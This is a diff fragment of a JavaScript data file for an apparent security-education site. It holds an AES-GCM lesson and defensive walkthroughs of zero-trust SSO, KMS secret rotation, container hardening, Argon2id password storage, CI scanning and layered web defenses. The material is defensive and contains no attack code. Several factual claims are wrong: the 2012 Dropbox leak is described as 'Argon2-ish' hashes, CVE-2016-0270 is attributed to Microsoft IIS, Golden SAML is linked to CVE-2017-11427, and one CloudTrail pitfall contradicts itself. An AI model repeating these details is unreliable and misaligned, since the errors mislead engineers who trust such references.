+        { title: 'Worked Example — Encrypting a JWT', text: 'Suppose you store a session in a cookie. Generate K from a server master secret via HKDF. For each session: N = monotonic 96-bit counter from a database, AAD = user_id ‖ "session_v2", P = JSON payload. Send `base64url(N) || base64url(C || T)`. On decrypt, look up N to ensure it has not been replayed. The AAD ties the ciphertext to the user — swapping cookies between users fails the tag check.' },
+        { title: 'Pitfall — Nonce Reuse Is Catastrophic', text: 'Two messages encrypted with the same (K, N): C₁⊕C₂ = P₁⊕P₂ (full confidentiality break of CTR), AND the attacker can solve a small linear system in GF(2¹²⁸) to recover the GHASH key H, after which they forge arbitrary ciphertexts. This is not theoretical: in 2016, Böck/Zauner/Devlin found 184 HTTPS hosts (Cisco ASA, Radware, others) reusing GCM nonces. Defenses: (a) deterministic counter from a database, (b) XChaCha20-Poly1305 with a 192-bit random nonce, or (c) misuse-resistant AEAD like AES-GCM-SIV (RFC 8452) that survives accidental reuse.' },
+        { title: 'When to Use What', text: 'AES-GCM: hardware-accelerated (AES-NI on x86, ARMv8 crypto extensions), the default in TLS 1.3, IPsec, SSH. ChaCha20-Poly1305: software-fast on phones without AES-NI, constant-time by design — used by Google QUIC and as the second TLS 1.3 ciphersuite. AES-GCM-SIV: nonce-misuse-resistant, slower; pick it when nonces come from sources you do not fully trust (e.g., shared across distributed encryptors).' }
+      ],
+      keypoints: [
+        { title: '96-bit Nonce, 128-bit Tag', text: 'NIST SP 800-38D: GCM mandates 12-byte nonces; truncated tags weaken forgery resistance.' },
+        { title: 'Rekey Every 2³² Messages', text: 'Nonce-collision probability passes safety threshold around 2³² messages per key — derive subkeys via HKDF.' },
+        { title: 'AAD Binds Context', text: 'Use AAD for headers/metadata to stop ciphertext-swapping attacks across users or endpoints.' },
+        { title: 'Never Roll Your Own', text: 'Use libsodium, Tink, or AWS Encryption SDK — primitives are easy to compose insecurely (Joux\'s "Forbidden Attack" 2006).' },
+        { title: 'CVE-2016-0270', text: 'Real-world GCM nonce reuse in Microsoft IIS — fixed by a Windows update, but the lesson stuck.' }
+      ]
+    }
+  ],
+
+  useCases: [
+    {
+      id: 'uc-zero-trust-sso', title: 'Zero-Trust SSO with mTLS & SAML',
+      desc: 'How a workforce request to an internal API is authenticated, authorized, and end-to-end encrypted under a zero-trust model — every hop verifies identity, no implicit network trust.',
+      icon: '🛡️', color: '#58a6ff',
+      summary: '<strong>Zero-trust replaces "inside the VPN = trusted" with "every request is authenticated, authorized, and encrypted."</strong> The request walks through five gates — device attestation, mutual TLS, IdP user proof, policy engine, and a forwarded short-lived JWT — so a stolen password alone, a stolen device alone, or a network foothold alone is never enough.',
+      pipeline: 'Laptop ──[TPM attest]──► Device-Trust CA ──► short-lived devcert (24h)\n   │\n   └──[mTLS TLS 1.3]──► IAP proxy ──[OIDC redirect]──► Okta/Entra\n                          │                              │\n                          │◄──── signed SAML / id_token ──┘\n                          │\n                          └──► OPA/Cedar PDP ──(allow + 5-min JWT)──► API svc',
+      metrics: [
+        { label: 'TLS 1.3 1-RTT handshake', value: '~80–120 ms (cold)' },
+        { label: 'Device cert lifetime', value: '24 h (Google BeyondCorp)' },
+        { label: 'Scoped JWT lifetime', value: '5 min, aud-bound' },
+        { label: 'WebAuthn phishing-resistance', value: '0 known successful phish' }
+      ],
+      extensions: 'Continuous access evaluation (CAEP), risk-scored step-up auth, SPIFFE/SPIRE workload identity for service-to-service mTLS, and binding tokens to TLS exporters (RFC 8471 token binding / DPoP).',
+      steps: [
+        { title: '1. Device posture check', component: 'Endpoint agent → Device-trust service', detail: 'Before TLS even starts, the corporate agent attests OS version, disk-encryption status, and EDR health. The result is a short-lived device certificate (X.509, 24h) issued by an internal CA.', proto: 'TPM-attestation / SCEP',
+          intuition: 'The TPM signs a quote of PCR values with a key that never leaves the chip — so an attacker on the box cannot forge "I am a healthy corp laptop."',
+          example: 'Google BeyondCorp issues device certs that live ~24 h; ChromeOS Verified Boot quotes 7 PCRs covering firmware, kernel, and rootfs hashes.',
+          pitfall: 'Issuing the cert to disk instead of binding it to TPM-resident keys lets malware export the credential and impersonate the device from anywhere.',
+          refs: [{ label: 'BeyondCorp paper (Google)', url: 'https://research.google/pubs/pub43231/' }] },
+        { title: '2. mTLS to the proxy', component: 'Browser/CLI → Identity-Aware Proxy', detail: 'The client opens TLS 1.3 to proxy.corp; the proxy requests a client certificate (CertificateRequest in the handshake). Both sides authenticate each other before any HTTP byte flows.', proto: 'TLS 1.3 + RFC 8446 §4.3.2',
+          intuition: 'Server-only TLS proves "I reached the right server" but not "the right client reached it"; mTLS closes that gap inside the handshake before any HTTP byte is sent.',
+          complexity: 'O(1) handshakes/conn · 1 RTT (TLS 1.3) vs 2 RTT (TLS 1.2)',
+          example: 'TLS 1.3 with X25519 + AES-128-GCM: ~80–120 ms full handshake over the open internet; 0-RTT resumption brings repeat connections to ~1 ms application latency.',
+          code: 'curl --cert dev.crt --key dev.key https://proxy.corp/api' },
+        { title: '3. SAML / OIDC user assertion', component: 'Proxy → IdP (Okta/Entra)', detail: 'The proxy redirects to the IdP, which checks the user password + WebAuthn second factor and returns a signed SAML assertion (or OIDC id_token) containing groups and risk score.', proto: 'SAML 2.0 / OIDC + RS256',
+          intuition: 'The IdP is the single oracle for "who is this human?" — every downstream system trusts an RS256 signature instead of holding its own password DB.',
+          example: 'WebAuthn/passkeys: the authenticator signs a server challenge with an origin-bound P-256 keypair. Google reports 0 successful phishing attacks against security-key users in production.',
+          pitfall: 'Forgetting to validate "audience" / "issuer" in the assertion lets an attacker replay a token issued for a different app (Golden SAML, CVE-2017-11427).',
+          refs: [{ label: 'OIDC Core 1.0', url: 'https://openid.net/specs/openid-connect-core-1_0.html' }] },
+        { title: '4. Policy decision', component: 'Proxy → OPA/Cedar PDP', detail: 'Combine device posture + user groups + resource sensitivity + time-of-day. Output is allow/deny plus a 5-minute scoped JWT for the upstream service.', proto: 'Rego / Cedar',
+          intuition: 'Separating policy decision (PDP) from policy enforcement (PEP) means rules are auditable code in git, not scattered if-statements inside each service.',
+          complexity: 'O(rules · facts) per decision — typical PDP: < 1 ms @ p99',
+          example: 'Netflix\'s ConsoleMe + OPA evaluates ~10k policies/sec per replica with median 0.3 ms decision time; policy bundles ship via OCI artifacts every 30 s.',
+          code: 'allow { input.device.trusted; input.user.groups[_] == "engineering" }' },
+        { title: '5. Forwarded short-lived token', component: 'Proxy → API service (mTLS again)', detail: 'Proxy injects X-Forwarded-User and a signed JWT; the upstream verifies signature against IdP JWKS, enforces audience claim, and logs the call.', proto: 'JWT (RS256) + JWKS',
+          intuition: 'Short lifetime + audience binding means a stolen token is worthless in minutes and only at the one service it was minted for — no global "session cookie."',
+          example: 'AWS STS issues 15-minute–12-hour session creds; Kubernetes projected ServiceAccount tokens default to 1 h with audience claim bound to the target API.',
+          pitfall: 'Accepting "alg: none" or letting "alg" be controlled by the token (CVE-2015-9235) skips signature verification entirely — pin the algorithm server-side.',
+          refs: [{ label: 'RFC 7519 — JWT', url: 'https://datatracker.ietf.org/doc/html/rfc7519' }] }
+      ]
+    },
+    {
+      id: 'uc-secret-rotation', title: 'Automated Secret Rotation with KMS',
+      desc: 'A database password is rotated every 24 hours by a workflow that never lets a human or a long-lived process see the cleartext credential.',
+      icon: '🔑', color: '#7ee787',
+      summary: '<strong>Secrets that never expire become secrets that always leak.</strong> A rotator workflow generates a fresh credential, encrypts it under an HSM-bound key, applies it atomically with a grace window for in-flight callers, and lets apps fetch it via workload identity — so a leaked log line, image layer, or git commit decays to harmless within hours.',
+      pipeline: 'EventBridge (24h) ─► Rotator Lambda\n                       │\n                       ├─► KMS Encrypt(new pw)\n                       ├─► Secrets Manager: new version = AWSPENDING\n                       ├─► ALTER USER on RDS\n                       └─► promote to AWSCURRENT (old → AWSPREVIOUS, 6h grace)\n\nApp Pod ──IRSA──► Secrets Manager ─► plaintext (in-memory, 5-min TTL)',
+      metrics: [
+        { label: 'Rotation cadence', value: '24 h (PCI: ≤ 90 d, NIST: 1 yr)' },
+        { label: 'KMS key strength', value: 'AES-256, FIPS 140-2 L3 HSM' },
+        { label: 'Grace window for old cred', value: '6 h (AWSPREVIOUS)' },
+        { label: 'In-app cache TTL', value: '5 min (SDK default)' }
+      ],
+      extensions: 'Dynamic short-lived database credentials via HashiCorp Vault (TTL ≈ 1 h, no rotation needed), SPIFFE-issued mTLS certs for service-to-DB auth, and envelope encryption with per-tenant DEKs wrapped by a KEK.',
+      steps: [
+        { title: '1. KMS-backed master key', component: 'AWS KMS / Azure Key Vault HSM', detail: 'A non-exportable AES-256 customer-managed key lives in an FIPS 140-2 L3 HSM. All wrap/unwrap calls are logged in CloudTrail.', proto: 'AWS KMS / PKCS#11',
+          intuition: 'If the key material can never leave the HSM, then "compromise the encryption key" requires physically owning the HSM — not just popping a server.',
+          example: 'AWS KMS uses HSMs with FIPS 140-2 Level 3 hardware; a single key handles ≥10k req/s and every Encrypt/Decrypt is recorded in CloudTrail within ~5 min.',
+          pitfall: 'Granting kms:Decrypt with Resource:"*" turns the whole org into one trust boundary — scope key policies and IAM by kms:EncryptionContext.',
+          refs: [{ label: 'AWS KMS Cryptographic Details', url: 'https://docs.aws.amazon.com/kms/latest/cryptographic-details/' }] },
+        { title: '2. Rotator Lambda generates new password', component: 'Lambda (least-priv role)', detail: 'A scheduled Lambda generates a 32-byte random password from /dev/urandom, encrypts it with KMS:Encrypt, and writes the ciphertext to Secrets Manager (versioned).', proto: 'AWS Secrets Manager',
+          intuition: '32 bytes from a CSPRNG = 256 bits of entropy — brute-forcing is computationally equivalent to breaking AES-256, i.e., infeasible.',
+          complexity: 'O(1) crypto work; rotation latency dominated by 1 RDS round-trip',
+          example: 'secrets.token_urlsafe(32) yields 43 URL-safe chars at full 256-bit entropy; Python\'s secrets module reads from os.urandom which is ChaCha20-based on modern Linux.',
+          pitfall: 'Using random.random() or Math.random() instead of a CSPRNG gives ~32 predictable bits — fully crackable on a laptop in seconds.',
+          code: 'pw = secrets.token_urlsafe(32); kms.encrypt(KeyId=k, Plaintext=pw)' },
+        { title: '3. Apply to database', component: 'Lambda → RDS', detail: 'Lambda connects with the OLD password (still active), runs ALTER USER app SET PASSWORD=NEW, then marks the new version AWSCURRENT. Old version stays AWSPREVIOUS for a 6-hour grace window.', proto: 'PostgreSQL ALTER ROLE',
+          intuition: 'A grace window where both old and new creds work prevents a thundering-herd outage as long-lived connection pools recycle.',
+          example: 'AWS Secrets Manager versions: AWSPENDING → AWSCURRENT → AWSPREVIOUS staircase; default 6-h gap before the previous is reaped.',
+          pitfall: 'Rotating without a grace window causes "password authentication failed" storms across every pod with an open pool — at scale (10k req/s) that\'s an outage.' },
+        { title: '4. App reads via IAM', component: 'App pod → Secrets Manager', detail: 'Application uses IRSA (IAM Roles for Service Accounts) to call GetSecretValue — no static AWS keys on disk. SDK caches for 5 min and refreshes on auth failure.', proto: 'IAM SigV4',
+          intuition: 'Workload identity replaces "secret to access the secret" with cryptographic proof from the orchestrator (a signed projected SA token).',
+          example: 'EKS IRSA mints a 1-h OIDC token per pod; AWS STS exchanges it for 15-min–12-h IAM creds — the pod never sees a long-lived AWS access key.',
+          code: 'aws secretsmanager get-secret-value --secret-id prod/db' },
+        { title: '5. Audit & alert', component: 'CloudTrail → Detection-as-code', detail: 'Any GetSecretValue from outside the expected role triggers a SOAR ticket; failed rotations page on-call. Recovery runbook = mark previous version current and rerun rotator.', proto: 'CloudTrail + Sigma rules',
+          intuition: 'Rotation is only as good as its observability — if a rotator silently fails on Sunday, by Monday all your "rotated" secrets are stale and humans don\'t know.',
+          pitfall: 'CloudTrail data-plane events for Secrets Manager are NOT enabled by default for management events — turn on data events or you miss every GetSecretValue.' }
+      ]
+    },
+    {
+      id: 'uc-container-hardening', title: 'Hardening a Container Image',
+      desc: 'Take a Node.js service from a 1.2 GB ubuntu:latest image with root + curl + bash to a 90 MB distroless image with a non-root user, no shell, signed and SBOM-attested.',
+      icon: '📦', color: '#ffa657',
+      summary: '<strong>Defense-in-depth for containers means removing tools an attacker would need post-RCE.</strong> Slim the base, drop kernel capabilities, scan for CVEs, sign the artifact through a transparency log, and refuse to admit anything unsigned at the cluster edge — every layer reduces blast radius even if the next one fails.',
+      pipeline: 'Dockerfile (multi-stage)\n  build stage (node:20) ──► /app/dist\n         │\n         ▼\n  distroless/nodejs20 (90 MB, no sh, USER 65532)\n         │\n  trivy scan ─► syft SBOM ─► cosign sign (OIDC → Fulcio → Rekor)\n         │                                              │\n         ▼                                              ▼\n  registry push ─────► Kyverno admission verify ──► Pod (PSA restricted)',
+      metrics: [
+        { label: 'Image size reduction', value: '1.2 GB → 90 MB (~93%)' },
+        { label: 'Attack surface (binaries)', value: '500+ → 0 shells, 0 pkg mgr' },
+        { label: 'CVE gating', value: 'Block HIGH/CRITICAL @ build' },
+        { label: 'Signature transparency', value: 'Rekor public log (Sigstore)' }
+      ],
+      extensions: 'gVisor or Kata Containers for kernel isolation, Falco/Tetragon for runtime eBPF detection, SLSA Level 3+ provenance attestations, and reproducible builds so two CI runs of the same SHA produce byte-identical images.',
+      steps: [
+        { title: '1. Multi-stage Dockerfile', component: 'Builder stage', detail: 'First stage uses node:20 to npm ci and bundle. Second stage copies only /app/dist + node_modules into gcr.io/distroless/nodejs20-debian12 — no apt, no shell, no package manager.', proto: 'Docker BuildKit',
+          intuition: 'Every binary in the final image is a tool the attacker gets for free after RCE — distroless removes sh, curl, apt, so post-exploitation has nothing to land on.',
+          example: 'Distroless nodejs20 ≈ 90 MB vs ubuntu:latest ≈ 1.2 GB and node:20 ≈ 1.1 GB. Google reports >50% of Borg workloads use distroless or scratch.',
+          pitfall: 'Forgetting USER 65532 (or USER nonroot) leaves PID 1 running as root — exploits inside the container then have CAP_NET_BIND, /etc write, etc.',
+          code: 'FROM node:20 AS build\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --omit=dev\nCOPY . .\n\nFROM gcr.io/distroless/nodejs20\nCOPY --from=build /app /app\nUSER 65532\nCMD ["/app/server.js"]' },
+        { title: '2. Drop Linux capabilities', component: 'Pod securityContext', detail: 'runAsNonRoot:true, readOnlyRootFilesystem:true, allowPrivilegeEscalation:false, capabilities.drop:["ALL"], seccompProfile:RuntimeDefault. Stops most container-escape primitives even if the app is RCE.', proto: 'Kubernetes PSA "restricted"',
+          intuition: 'Linux splits "root" into ~40 capabilities; dropping ALL turns root inside the container into something less powerful than a regular Unix user on the host.',
+          example: 'Docker default seccomp profile blocks ~44 syscalls including keyctl, ptrace, and userfaultfd — directly mitigates ~30% of historic kernel CVEs used for container escape.',
+          pitfall: 'Adding NET_ADMIN or SYS_ADMIN "just to make it work" hands back the entire capability bitmap — SYS_ADMIN alone is enough for nsenter-style escapes.',
+          refs: [{ label: 'Pod Security Standards', url: 'https://kubernetes.io/docs/concepts/security/pod-security-standards/' }] },
+        { title: '3. Scan & SBOM', component: 'CI: trivy + syft', detail: 'trivy image --severity HIGH,CRITICAL fails the build on known CVEs. syft generates a CycloneDX SBOM stored as an OCI artifact next to the image.', proto: 'Trivy / Syft / CycloneDX',
+          intuition: 'An SBOM turns "what\'s in the image?" from forensics-after-the-fact into a queryable index — Log4Shell triage took minutes for SBOM-enabled orgs vs days for others.',
+          complexity: 'O(layers · packages) — typical 90 MB image: < 5 s end-to-end',
+          example: 'Trivy ships with ~250k vuln advisories (NVD + GHSA + vendor feeds) updated every 6 h; scanning a 90 MB distroless image is < 3 s in CI.',
+          code: 'trivy image --exit-code 1 --severity HIGH,CRITICAL myapp:$SHA' },
+        { title: '4. Sign with cosign (keyless)', component: 'CI → Sigstore', detail: 'cosign sign uses an OIDC token from the CI runner to get a short-lived Fulcio cert; signature + cert are stored in the Rekor transparency log. No long-lived signing key.', proto: 'Sigstore (Fulcio + Rekor)',
+          intuition: 'Keyless signing = ephemeral cert tied to a verifiable OIDC identity (e.g., github.com/org/repo@sha), recorded in an append-only Merkle log — no secret to leak.',
+          example: 'Rekor stores >100M signatures publicly; Fulcio certs live ~10 min, just long enough to sign + upload. Used by Kubernetes, Istio, Cilium release pipelines.',
+          pitfall: 'Verifying signature presence but not the OIDC identity claims means any attacker with any Sigstore-trusted cert can sign your image — pin to issuer + subject regex.',
+          refs: [{ label: 'Sigstore docs', url: 'https://docs.sigstore.dev/' }] },
+        { title: '5. Admission policy', component: 'Cluster: Kyverno / Gatekeeper', detail: 'Cluster only admits images whose cosign signature verifies against the GitHub OIDC issuer for org/repo. Unsigned or 3rd-party images are rejected at admission.', proto: 'Kyverno verifyImages',
+          intuition: 'A signature you don\'t enforce is a signature that doesn\'t exist — the admission webhook is the choke point that makes the supply chain non-bypassable.',
+          pitfall: 'Setting failurePolicy: Ignore on the webhook means an outage of the policy engine lets any image deploy — pick Fail and accept the brief outage instead.' }
+      ]
+    },
+    {
+      id: 'uc-password-storage', title: 'Secure Password Storage with Argon2id',
+      desc: 'How a sign-up flow stores credentials so a database leak does not become an account takeover at internet scale.',
+      icon: '🔐', color: '#d2a8ff',
+      summary: '<strong>Assume the database will leak — design so leaked rows aren\'t worth cracking.</strong> Pre-check against breach corpora, hash with a memory-hard KDF, pepper inside an HSM, and rate-limit with step-up auth. Each layer multiplies attacker cost: from "rainbow table in 0.1 s" to "decades on a GPU farm."',
+      pipeline: 'Browser ──TLS 1.3──► /signup\n   │\n   ▼\nServer: HIBP k-anon range API (first 5 chars of SHA-1)\n   │  (reject ≥40 chars / common-list match)\n   ▼\nArgon2id(m=64MiB, t=3, p=4, salt=16B) ─► tag (32B)\n   │\n   ▼\nHMAC-SHA256(pepper_in_HSM, tag) ──► DB row\n\nLogin: verify + check params → if outdated, rehash to current policy',
+      metrics: [
+        { label: 'Argon2id cost', value: '64 MiB · 3 iters · 4 lanes' },
+        { label: 'Per-hash time @ server', value: '~0.5–1 s (intended)' },
+        { label: 'GPU crack rate vs MD5', value: '~10–100 H/s vs ~30 GH/s' },
+        { label: 'HIBP corpus', value: '~847M unique pwned passwords' }
+      ],
+      extensions: 'Passkeys/WebAuthn to eliminate passwords entirely, OPAQUE aPAKE so the server never sees the password even during login, and per-user pepper rotation via envelope encryption.',
+      steps: [
+        { title: '1. TLS to the auth service', component: 'Browser → /signup', detail: 'Form is submitted over TLS 1.3; the password leaves the user device only inside the encrypted tunnel. SameSite=Lax cookie + CSRF token gate the POST.', proto: 'HTTPS + CSRF token',
+          intuition: 'Without TLS, every coffee-shop AP is a credential harvester; without SameSite + CSRF, every cross-origin form is one.',
+          pitfall: 'Logging the request body for "debugging" writes plaintext passwords into log aggregators — scrub at the edge or never log POST bodies on auth routes.' },
+        { title: '2. Server-side validation', component: 'Auth service', detail: 'Reject ≥40 char strings; check against the HIBP "Pwned Passwords" k-anonymity API (send first 5 chars of SHA-1, compare locally). Enforce minimum 12 chars and no common-list match.', proto: 'HIBP Range API',
+          intuition: 'k-anonymity: sending the first 5 hex chars of SHA-1 returns ~500 candidates — the server never sees the actual hash, but you still get a hit/miss check.',
+          example: 'The HIBP corpus contains ~847M unique pwned password hashes (v8); Cloudflare fronts the API and serves ~10⁹ queries/month with no PII exfil risk.',
+          pitfall: 'Sending the full SHA-1 hash instead of the 5-char range prefix discloses to the API operator exactly which passwords your users use.',
+          refs: [{ label: 'HIBP Pwned Passwords', url: 'https://haveibeenpwned.com/API/v3#PwnedPasswords' }] },
+        { title: '3. Hash with Argon2id', component: 'libsodium / argon2-cffi', detail: 'Argon2id with m=64 MiB, t=3 iterations, p=4 lanes, 16-byte salt, 32-byte tag. Memory-hardness defeats GPU/ASIC cracking; per-hash random salt defeats rainbow tables.',
+          intuition: 'Memory-hard means an attacker can\'t trade time for parallelism — a GPU with 16 GB VRAM can run only ~250 Argon2id instances in parallel vs ~10⁹ for MD5.',
+          complexity: 'O(m·t) memory-time product — by design ≈ 0.5–1 s on a server core',
+          example: 'OWASP 2024 recommends m=19 MiB, t=2 minimum; high-security sites use m=64 MiB. Cracking rates on RTX 4090: MD5 ≈ 165 GH/s vs Argon2id ≈ 50 H/s — a ~10⁹× slowdown.',
+          pitfall: 'Using bcrypt with cost ≤ 10 in 2024 is GPU-crackable at ~50k H/s — and bcrypt truncates passwords at 72 bytes silently.',
+          code: 'hash = argon2.PasswordHasher(\n    time_cost=3, memory_cost=65536,\n    parallelism=4).hash(pw)',
+          proto: 'RFC 9106 (Argon2)',
+          refs: [{ label: 'OWASP Password Storage Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html' }] },
+        { title: '4. Pepper in HSM', component: 'KMS-wrapped HMAC key', detail: 'Before storing, HMAC-SHA256(pepper, argon2_hash) where the pepper key never leaves the HSM. A DB-only leak (no HSM access) yields useless ciphertext.', proto: 'HMAC-SHA256 in HSM',
+          intuition: 'Salt is per-user and public; pepper is global and secret-in-HSM. Two leaks needed (DB + HSM) for any offline cracking to even start.',
+          example: 'Dropbox 2012 leak: 68M Argon2-ish hashes leaked but no pepper — cracking attempts in 2016 still recovered < 5% of accounts; pepper would have made it ~0%.',
+          pitfall: 'Storing the pepper as a Kubernetes Secret or env var isn\'t a pepper — it\'s a longer password sitting next to the DB.' },
+        { title: '5. Login + upgrade-on-verify', component: 'Auth service', detail: 'On login, recompute Argon2 with the stored params; if params are below current policy, transparently rehash with the new policy. Rate-limit failed logins (e.g., 5/15 min) and require WebAuthn step-up after threshold.', proto: 'Argon2 verify + rehash',
+          intuition: 'You can\'t mass-migrate hashes (no plaintext on disk!), but you can lazily upgrade every successful login — most active users migrate within weeks.',
+          example: 'Discourse and GitLab both auto-rehash on login; a typical site reaches >95% migration within 30 days of an active-user cohort.',
+          pitfall: 'Forgetting to rate-limit per-account (not just per-IP) lets attackers password-spray from a botnet with 1 try per IP — bypassing IP-only limits entirely.' }
+      ]
+    },
+    {
+      id: 'uc-sast-in-ci', title: 'SAST + Secret-Scanning in CI',
+      desc: 'A pull-request pipeline that fails fast on insecure code patterns and leaked credentials before code ever reaches main.',
+      icon: '🧪', color: '#f778ba',
+      summary: '<strong>"Shift-left" means the cheapest place to find a bug is in the developer\'s editor, the next is the PR, and the most expensive is production.</strong> A layered CI pipeline catches secrets at commit, static bugs (SQLi/XSS/SSRF) at PR, vulnerable deps at merge, misconfigured infra at plan, and unsigned images at deploy — five gates, each strictly cheaper than the breach it prevents.',
+      pipeline: 'Local commit\n   └─ pre-commit + gitleaks (secrets)\n\nGitHub PR\n   ├─ CodeQL (SAST: SQLi, XSS, SSRF, deserialization)\n   ├─ dependency-review-action (OSV/GHSA)\n   ├─ tfsec / checkov (IaC misconfig)\n   └─ trivy + cosign (image CVEs + signature)\n\n  ❌ any fail → block merge / block deploy\n  ✅ all pass → squash-merge to main',
+      metrics: [
+        { label: 'CodeQL coverage', value: '~330 queries · 10+ languages' },
+        { label: 'gitleaks rule set', value: '~150 regexes (AWS/GCP/JWT/PEM)' },
+        { label: 'GHSA advisory DB', value: '~250k advisories, ~50/day new' },
+        { label: 'SQLi prevalence (OWASP)', value: 'Top 10 since 2003 — still A03:2021' }
+      ],
+      extensions: 'DAST/IAST in staging, fuzzing in CI (OSS-Fuzz / Atheris), SLSA Level 3 build provenance, and "policy-as-code" admission via Kyverno or OPA for full pipeline-to-cluster enforcement.',
+      steps: [
+        { title: '1. Pre-commit local hook', component: 'pre-commit + gitleaks', detail: 'Developer installs gitleaks as a pre-commit hook so AWS keys / private keys / Slack tokens are caught locally before they ever hit the remote.', proto: 'pre-commit framework',
+          intuition: 'Once a secret reaches a public commit, it must be rotated — even instant deletion leaves it in the reflog and in GitHub\'s event firehose.',
+          example: 'GitHub\'s 2023 SOTR report: ~12.8M secrets exposed in public commits; AWS scans the GitHub firehose and auto-quarantines leaked access keys within minutes.',
+          pitfall: 'Adding a leaked key to .gitignore after the commit doesn\'t un-leak it — git log -p still shows it forever; assume it\'s burned and rotate.',
+          code: 'gitleaks protect --staged --redact' },
+        { title: '2. CodeQL on PR', component: 'GitHub Actions: codeql-action', detail: 'On every pull-request, CodeQL builds the repo and runs the security-extended query suite (SQLi, XSS, SSRF, path traversal, deserialization). Results post as PR review comments and block merge.', proto: 'CodeQL / SARIF',
+          intuition: 'CodeQL models code as a database; queries are graph traversals like "user input flows to a string concatenated into a SQL query" — a taint-tracking dataflow problem.',
+          complexity: 'O(LOC × query-depth) — typical repo: 5–15 min in CI',
+          example: 'SQLi has been in the OWASP Top 10 since 2003 (currently A03:2021 Injection). CodeQL\'s py/sql-injection query catches the canonical f"SELECT … {user_input}" pattern with near-zero false negatives.',
+          refs: [{ label: 'CodeQL docs', url: 'https://codeql.github.com/docs/' }] },
+        { title: '3. Dependency review', component: 'GHAS dependency-review-action', detail: 'Diffs the lockfile against the GitHub Advisory DB; PR fails if it introduces a HIGH/CRITICAL CVE or a copyleft license. Renovate auto-opens PRs to bump vulnerable transitive deps.', proto: 'OSV / GHSA',
+          intuition: 'Most modern apps are 80–90% third-party code by line count — your "own" security posture is dominated by your dependency tree.',
+          example: 'Log4Shell (CVE-2021-44228, CVSS 10.0): a single transitive dep in millions of Java apps; orgs with dependency review patched in hours, others took weeks.',
+          pitfall: 'Pinning only direct deps (npm package.json) without a committed lockfile lets transitive deps drift — the actual install at CI ≠ what was reviewed.' },
+        { title: '4. IaC scan', component: 'tfsec / checkov', detail: 'Terraform plan is scanned for public S3 buckets, 0.0.0.0/0 security groups, unencrypted RDS, missing logging. Findings annotated inline on the PR diff.', proto: 'OPA Rego policies',
+          intuition: 'Most cloud breaches are misconfig, not 0-days — scanning the plan catches the public bucket before terraform apply makes it real.',
+          example: 'Capital One 2019 (~106M records): exploit chain started with an SSRF-able WAF and an over-privileged EC2 role — both detectable in IaC review.',
+          pitfall: 'Scanning only the .tf source and not the plan output misses dynamic values (variables, data sources) that determine the final configuration.',
+          code: 'tfsec . --minimum-severity HIGH --format sarif' },
+        { title: '5. Container & SBOM gate', component: 'trivy + cosign verify', detail: 'After image build, trivy fails on HIGH CVEs in the base image; admission controller rejects deploy if cosign signature is absent. Closes the supply-chain loop from PR → prod.', proto: 'Trivy + Sigstore',
+          intuition: 'The PR proved the source is OK; the image gate proves what actually shipped matches — closing the gap exploited by SolarWinds-style build-system compromises.',
+          pitfall: 'Scanning at build time but not at runtime means a CVE disclosed after deploy hides in the running cluster — re-scan registry images daily.' }
+      ]
+    },
+    {
+      id: 'uc-defense-in-depth-web', title: 'Defense-in-Depth Web Service',
+      desc: 'A public HTTP request to a SaaS API survives a hostile internet by passing through seven independent controls — any one failure must be caught by the next layer.',
+      icon: '🧱', color: '#79c0ff',
+      summary: '<strong>Defense-in-depth treats every control as fallible and stacks them so an attacker must defeat all of them.</strong> A single request flows through edge DDoS scrubbing, WAF rule-matching, TLS termination, mTLS to the app, parameterized DB queries, output encoding, and structured audit logging — each layer is independently sufficient against a different class of attack.',
+      pipeline: 'Internet ──► Anycast Edge (DDoS scrub, ~Tbps)\n     │\n     ▼\n  CDN + WAF (OWASP CRS) ──► TLS 1.3 terminate\n     │\n     ▼\n  L7 LB ──[mTLS]──► App (CSP, SameSite cookies, CSRF token)\n     │\n     ▼\n  ORM (parameterized SQL) ──► DB (least-priv role, row-level security)\n     │\n     ▼\n  Audit log ──► SIEM ──► detection rules + on-call',
+      metrics: [
+        { label: 'Cloudflare DDoS scrub capacity', value: '~388 Tbps (2024)' },
+        { label: 'SQLi in OWASP Top 10', value: 'A03:2021 (Injection)' },
+        { label: 'ASLR entropy (Linux x86-64)', value: '~28–30 bits user, 16 bits kernel' },
+        { label: 'Spectre disclosure rate', value: '~1–10 KB/s side-channel leak' }
+      ],
+      extensions: 'eBPF-based runtime detection (Falco/Tetragon), CSP Level 3 with nonces, Trusted Types to kill DOM-XSS structurally, CHERI capability hardware for memory safety, and confidential computing (SEV-SNP/TDX) for in-use data.',
+      steps: [
+        { title: '1. Edge DDoS & rate limiting', component: 'Anycast scrubbing center', detail: 'Anycast routes the SYN to the nearest of ~300 PoPs; SYN floods are absorbed by SYN cookies and per-IP/per-ASN token buckets before any backend sees a packet.', proto: 'BGP Anycast + SYN cookies',
+          intuition: 'Distributing inbound traffic across hundreds of PoPs turns a "single fat pipe to overwhelm" problem into a "many small pipes, attacker must overwhelm all" problem.',
+          complexity: 'O(1) per packet at line rate (XDP / hardware offload)',
+          example: 'Cloudflare\'s 2024 network capacity is ~388 Tbps; the largest mitigated L7 attack (Oct 2023) peaked at 201M req/s using HTTP/2 Rapid Reset (CVE-2023-44487).',
+          pitfall: 'Putting the WAF in DNS-only mode while the origin IP is in public DNS history lets attackers go direct — origin must be IP-allowlisted to the edge.' },
+        { title: '2. WAF + bot management', component: 'CRS rule engine', detail: 'OWASP Core Rule Set scores each request for SQLi/XSS/RCE/path-traversal patterns. Bot scores flag headless Chrome via TLS-JA3 + HTTP/2 fingerprint mismatch.', proto: 'ModSecurity / Coraza + CRS 4',
+          intuition: 'WAFs aren\'t a "fix" — they\'re an outer trip-wire that converts known-bad payloads into 403s while the app still does its own validation.',
+          example: 'SQL injection has been on the OWASP Top 10 every revision since 2003 and is still A03:2021 — automated scanners try ~30% of requests against random endpoints daily.',
+          pitfall: 'Running WAF in count-only mode "to avoid false positives" forever means it never actually blocks — tune in count mode for 2 weeks, then enforce.' },
+        { title: '3. TLS 1.3 termination', component: 'L7 LB (Envoy/NGINX)', detail: 'Edge terminates TLS 1.3 with X25519 key exchange + AES-128-GCM, OCSP stapling, HSTS preload. Modern AES-NI hardware does ~5–8 GB/s per core of AES-GCM throughput.', proto: 'TLS 1.3 (RFC 8446)',
+          intuition: 'TLS 1.3 removed every cipher mode known to be footgun-prone (CBC, RC4, RSA key exchange) — the negotiation surface itself is the simplification.',
+          complexity: '1-RTT handshake (vs 2 in TLS 1.2); 0-RTT for resumption',
